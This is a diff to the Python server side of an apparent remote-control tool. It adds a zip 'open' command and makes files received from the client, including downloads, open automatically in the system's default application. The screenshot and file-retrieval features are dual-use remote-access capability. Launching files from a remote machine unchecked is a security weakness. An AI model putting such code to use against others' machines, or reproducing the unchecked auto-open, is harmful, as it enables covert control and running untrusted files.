@@ -1,9 +1,35 @@
 import os
 import time
-import traceback
+import subprocess
 from generalServer import *
 from connectionServer import *
 
+
+def openZip(comando, clientConnection):
+    global fileLog
+    try:
+        filerecv = clientConnection.recv(1024)
+        try:
+            fileIf = filerecv.decode(FORMAT)
+        except:
+            fileIf = ""
+
+        print(fileIf)
+        if fileIf[0:7] != "[ERROR]":
+            while (filerecv != b'[END]'):
+                print(fileIf)
+                fileLog = fileLog + "\n" + fileIf
+                filerecv = clientConnection.recv(1024)
+                fileIf = filerecv.decode(FORMAT)
+
+
+            fileLog = fileLog + "\n"
+        else:
+            raise Exception
+
+    except:
+        fileLog = fileLog + "\n" + "Command open gone wrong\n"
+        print("Command open gone wrong\n")
 
 def filespath(clientConnection):
     global fileLog
@@ -26,11 +52,9 @@ def filespath(clientConnection):
             if fileIf[0:7] != "[ERROR]":
 
                 scritti = 0
-                while (filerecv):
+                while (filerecv != b'[END]'):
                     scritti = scritti + file.write(filerecv)
                     filerecv = clientConnection.recv(1024)
-                    if filerecv == b'[END]':
-                        filerecv = ''
 
                 file.close()
 
@@ -46,6 +70,16 @@ def filespath(clientConnection):
                     fileLog = fileLog + "\n" + f"File successfully created!\n"
                     print(f"File successfully created!\n")
                     time.sleep(2)
+
+                try:
+                    if platform.system() == 'Darwin':  # macOS
+                        subprocess.call(('open', os.getcwd()+"/"+nomeFile))
+                    elif platform.system() == 'Windows':  # Windows
+                        os.startfile(os.getcwd()+"\\"+nomeFile)
+                    else:  # linux variants
+                        subprocess.call(('xdg-open', os.getcwd()+"/"+nomeFile))
+                except:
+                    pass
             else:
                 raise Exception
         except:
@@ -117,6 +151,8 @@ def download(comando,clientConnection):
                         fileLog = fileLog + "\n" + f"File {nomeFile} successfully downloaded\n" + "\n"
                         print(f"File {nomeFile} successfully downloaded\n")
                     time.sleep(2)
+                    return nomeFile
+
                 else:
                     raise Exception
             else:
@@ -130,6 +166,7 @@ def download(comando,clientConnection):
             except:
                 pass
             fileLog = fileLog + "\n" + "Download failed\n"
+            return "[ERROR]"
 
     else:
         print("The input doesn't match the regular expression for download command")
@@ -245,7 +282,19 @@ def remoteControl(clientConnection,buff):
 
 
             elif comando[0:8] == "download":
-                download(comando,clientConnection)
+                nomeFile= download(comando,clientConnection)
+                try:
+                    if nomeFile=="[ERROR]":
+                        pass
+                    else:
+                        if platform.system() == 'Darwin':  # macOS
+                            subprocess.call(('open', os.getcwd()+"/"+nomeFile))
+                        elif platform.system() == 'Windows':  # Windows
+                            os.startfile(os.getcwd()+"\\"+nomeFile)
+                        else:  # linux variants
+                            subprocess.call(('xdg-open', os.getcwd()+"/"+nomeFile))
+                except:
+                    pass
 
             elif comando[0:4] == "rete" or comando[0:7]=="network":
                 try:
@@ -306,6 +355,14 @@ def remoteControl(clientConnection,buff):
                     #traceback.print_exc()
                     print("Screenshot fallito\n")
                     fileLog = fileLog + "\n" + "Screenshot failed\n"
+
+            elif comando[0:4] == "open":
+                regex = r'^open \"[a-zA-Z0-9, ,\_,\-,\.,\']+\.zip\"'
+                if re.match(regex, comando):
+                    openZip(comando, clientConnection)
+                else:
+                    print("Regular Expression not matched!")
+
             else:
                print("[ERROR] Command not found... \n")
                fileLog = fileLog + "\n" + "[ERROR] Command not found... \n"
